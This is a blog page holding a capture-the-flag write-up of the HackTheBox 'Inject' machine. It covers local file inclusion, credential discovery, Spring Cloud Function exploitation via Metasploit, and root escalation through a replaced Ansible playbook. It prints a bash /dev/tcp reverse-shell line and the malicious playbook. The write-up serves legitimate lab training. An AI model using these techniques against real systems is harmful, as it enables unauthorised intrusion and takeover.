<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox: Inject write-up - bughunter.me</title><meta name="description" content="In this post we'll take a look at the solution to the Inject challenge on HackTheBox. The solution involves abusing an LFI vulnerability and exploiting&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta name="theme-color" content="#17181E" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#D73A42" media="(prefers-color-scheme: light)"><meta name="msapplication-navbutton-color" content="#D73A42"><meta name="apple-mobile-web-app-status-bar-style" content="#D73A42"><link rel="canonical" href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-inject-write-up/"><link rel="alternate" type="application/atom+xml" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.xml"><link rel="alternate" type="application/json" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.json"><meta property="og:title" content="HackTheBox: Inject write-up - bughunter.me "><meta property="og:image" content="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/inject-walkthrough.png"><meta property="og:image:width" content="900"><meta property="og:image:height" content="300"><meta property="og:site_name" content="bughunter.me"><meta property="og:description" content="In this post we'll take a look at the solution to the Inject challenge on HackTheBox. The solution involves abusing an LFI vulnerability and exploiting&hellip;"><meta property="og:url" content="https://e4ld3rs0n.github.io/bughunter-publii//hackthebox-inject-write-up/"><meta property="og:type" content="article"><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatdisplay/redhatdisplay.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatdisplay/redhatdisplay-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/redhatmono/redhatmono-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/css/style.css?v=547fc414e3f36b73498b60a767d2d398"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-inject-write-up/"},"headline":"HackTheBox: Inject write-up","datePublished":"2023-05-29T20:01+02:00","dateModified":"2025-01-27T20:23+01:00","image":{"@type":"ImageObject","url":"https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/inject-walkthrough.png","height":300,"width":900},"description":"In this post we'll take a look at the solution to the Inject challenge on HackTheBox. The solution involves abusing an LFI vulnerability and exploiting&hellip;","author":{"@type":"Person","name":"andrey","url":"https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/"},"publisher":{"@type":"Organization","name":"andrey"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><div class="container container--center"><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="bughunter.me" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="12" data-y_margin="12"></script><header class="header"><div class="header__logo"><a class="logo" href="https://e4ld3rs0n.github.io/bughunter-publii/">bughunter.me</a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/blog/" target="_self">/blog</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/homelab/" target="_self">/homelab</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" target="_self">/ctf</a></li><li class="has-submenu"><span class="is-separator" aria-haspopup="true">/more</span><ul class="navbar__submenu level-2" aria-hidden="true"><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/whoami/" title="About this blog" target="_self">whoami</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/privacy-policy/" target="_self">privacy-policy</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii//feed.xml" target="_self">rss-feed</a></li></ul></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">HackTheBox: Inject write-up</h1><div class="post__meta"><time datetime="2023-05-29T20:01" class="post__date">Monday, 29 May 2023 </time><span class="post__author"><a href="https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/" class="feed__author">andrey</a></span></div><div class="post__tags"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" class="invert">ctf</a> <a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/hackthebox/" class="invert">hackthebox</a></div></header><figure class="post__image post__cover"><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/inject-walkthrough.png" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/inject-walkthrough-xs.webp 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/inject-walkthrough-sm.webp 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/inject-walkthrough-md.webp 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/inject-walkthrough-lg.webp 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="300" width="900" alt=""></figure><div class="post__entry"><p></p><p>In this post we'll take a look at the solution to the Inject challenge on HackTheBox. The solution involves abusing an LFI vulnerability and exploiting a misconfigured service to obtain root privileges. The difficulty for this challenge is <code>Easy</code>.</p><p></p><p></p><h2 class="wp-block-heading">Enumeration</h2><p></p><p></p><p>We start the challenge by scanning the machine with Rustscan. We have two services running: SSH on the standard port 22 and a web server on port 8080. We also learn that we are dealing with an Ubuntu server. Since we don't have any credentials yet let's take a look at the web application.</p><p></p><p></p><p>After poking around we find that the application offers an image upload service. There is a file filter which rejects non-image files based on the file extension. Although the filter is very easy to bypass by changing the file extension, I did not find any obvious way to exploit it and get a reverse shell.</p><p></p><p></p><p>I noticed that after a successful upload the image is available by visiting the URL <code>/show_image?img=imagename.jpg</code> where the file name is passed as a parameter. This parameter might be abused to include any file that is locally present on the machine. To test this I tried to display the debian logo (which should be present on the machine as it is running Ubuntu) found by default in <code>/usr/share/pixmaps/debian-logo.png</code>:</p><p></p><p></p><figure class="wp-block-image size-large"><figure class="wp-image-284"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/01.local_file_inclusion-1024x609.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-xs.webp 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-sm.webp 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-md.webp 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/01.local_file_inclusion-1024x609-lg.webp 1024w"></figure></figure><p></p><p></p><p>Nice, we can take a look at the local filesystem. Let's open this request in Burp Suite Repeater and see if we can access the <code>/etc/passwd</code> file. Surprise, surprise - we can:</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-287"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/02.burpsuite.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-xs.webp 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-sm.webp 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-md.webp 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/02.burpsuite-lg.webp 1024w"></figure></figure><p></p><p></p><p>I found that the same 'img' parameter could be used to get a listing if I specified a directory. Very conveniently we can also see all the hidden directories in this way. Taking this route, I "navigated" to the '/home' directory which yielded a list of users on the machine, specifically two users named <code>phil</code> and <code>frank</code>. Inside <code>frank</code>'s home directory I also noticed an interesting file in <code>/home/frank/.m2/settings.xml</code> which contained some credentials:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;  &lt;servers&gt;    &lt;server&gt;      &lt;id&gt;Inject&lt;/id&gt;      &lt;username&gt;phil&lt;/username&gt;      &lt;password&gt;[REDACTED PASSWORD]&lt;/password&gt;      &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt;      &lt;filePermissions&gt;660&lt;/filePermissions&gt;      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;      &lt;configuration&gt;&lt;/configuration&gt;    &lt;/server&gt;  &lt;/servers&gt;&lt;/settings&gt;</pre><p></p><p></p><p>Trying to use these credentials to get an SSH session did not work. As I explored more I stumbled upon <code>/var/www/WebApp/pom.xml</code> which contained more valuable information:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">...&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;&lt;version&gt;3.2.2&lt;/version&gt;&lt;/dependency&gt;...</pre><p></p><p></p><h2 class="wp-block-heading">Initial foothold and user flag</h2><p></p><p></p><p>It looks like an outdated and potentially vulnerable version of the Spring Cloud Framework is in use (more information <a href="https://spring.io/security/cve-2022-22963" target="_blank" rel="noopener">here</a>). We can abuse it to gain a remote shell with Metasploit, using the module <code>multi/http/spring_cloud_function_spel_injection</code>:</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-288"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/03.metasploit.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-xs.webp 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-sm.webp 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-md.webp 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/03.metasploit-lg.webp 1024w"></figure></figure><p></p><p></p><p>We got access to the machine as <code>frank</code>. I proceeded to scan the machine with Linpeas which suggested that the machine might be vulnerable to CVE-2021-3560 and CVE-2022-2588. Unfortunately that was not really the case.</p><p></p><p></p><p>I started pspy next which revealed some interesting information:</p><p></p><p></p><figure class="wp-block-image size-large"><figure class="wp-image-290"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/04.pspy_-1024x530.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-xs.webp 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-sm.webp 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-md.webp 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/17/responsive/04.pspy_-1024x530-lg.webp 1024w"></figure></figure><p></p><p></p><p>It looks like Ansible Playbooks is running on the machine and executes the <code>playbook_1.yml</code> playbook found in the <code>/opt/automation</code> directory. This looks interesting, let's investigate further:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ls -alh /opt/automation	total 12Kdrwxr-xr-x 3 root root  4.0K Oct 20  2022 .drwxr-xr-x 3 root root  4.0K Oct 20  2022 ..drwxrwxr-x 2 root staff 4.0K May 29 19:08 tasksls -alh /opt/automation/taskstotal 12Kdrwxrwxr-x 2 root staff 4.0K May 29 19:10 .drwxr-xr-x 3 root root  4.0K Oct 20  2022 ..-rw-r--r-- 1 root root   150 May 29 19:10 playbook_1.yml</pre><p></p><p></p><p>Currently we don't have write permissions to mess with the playbook file. Remember the credentials we found earlier? Turns out we can become <code>phil</code> (and get the user flag!). Also notice that <code>phil</code> is in the <code>staff</code> group:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">id philuid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)</pre><p></p><p></p><h1 class="wp-block-heading">Root flag</h1><p></p><p></p><p>As <code>phil</code> we can't directly edit the <code>playbook_1.yml</code> file however nothing is there to stop us from deleting it and creating our own customized version of it.</p><p></p><p></p><p>For example we can get a reverse root shell on the box. To do so let's first create a reverse shell script on our local machine with the following content:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">/bin/bash -i &gt;&amp; /dev/tcp/[OUR IP]/[PORT] 0&gt;&amp;1</pre><p></p><p></p><p>We will also need a custom version of <code>playbook_1.yml</code> file:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">- hosts: localhost  tasks:  - name: Pwn the box    command: sudo bash /tmp/revshell.sh</pre><p></p><p></p><p>We can upload both files to the target box, move the bash script to <code>/tmp/revshell.sh</code> and <code>playbook_1.yml</code> to <code>/opt/automation/tasks</code> (remembering to delete the original playbook file and adding the execution permission to the shell script with <code>chmod</code>).</p><p></p><p></p><p>All that's left to do is to open a netcat listener on our box and get the root flag.</p><p></p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Monday, 27 January 2025</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-inject-write-up%2F" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-inject-write-up%2F" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%3A%20Inject%20write-up&amp;url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-inject-write-up%2F" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%3A%20Inject%20write-up https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-inject-write-up%2F" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-monitorstwo-write-up/" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  HackTheBox: MonitorsTwo write-up "><span class="btn__icon">←</span> <span class="btn__text">HackTheBox: MonitorsTwo write-up</span> </a><a href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-wgel-write-up/" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  TryHackMe: Wgel write-up "><span class="btn__text">TryHackMe: Wgel write-up</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>© 2023 - 2025 BugHunter</p></div></div></footer></div><script defer="defer" src="https://e4ld3rs0n.github.io/bughunter-publii/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'overlay',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script>'use strict'; document.addEventListener('DOMContentLoaded', function() { var obfElements = document.querySelectorAll('.obfuscated-email'); obfElements.forEach(function(elem) { var dataType = elem.getAttribute('data-type'); var encodedEmail = elem.getAttribute('data-email'); var user = elem.getAttribute('data-user'); var domain = elem.getAttribute('data-domain'); var decodedEmail = ''; if (user && domain) { decodedEmail = user.split('').reverse().join('') + '@' + domain.split('').reverse().join(''); } else if (encodedEmail) { const parts = encodedEmail.split('@'); if (parts.length === 2) { decodedEmail = parts[0].split('').reverse().join('') + '@' + parts[1].split('').reverse().join(''); } else { decodedEmail = encodedEmail; } } if (dataType === 'mailto') { var originalText = elem.textContent.trim(); var a = document.createElement('a'); a.href = 'mailto:' + decodedEmail; if (elem.classList.length > 0) { a.className = elem.className; } if (originalText === '') { a.textContent = decodedEmail; } else { a.textContent = originalText; } elem.parentNode.replaceChild(a, elem); } else if (dataType === 'text') { var textNode = document.createTextNode(decodedEmail); elem.parentNode.replaceChild(textNode, elem); } }); });</script></body></html>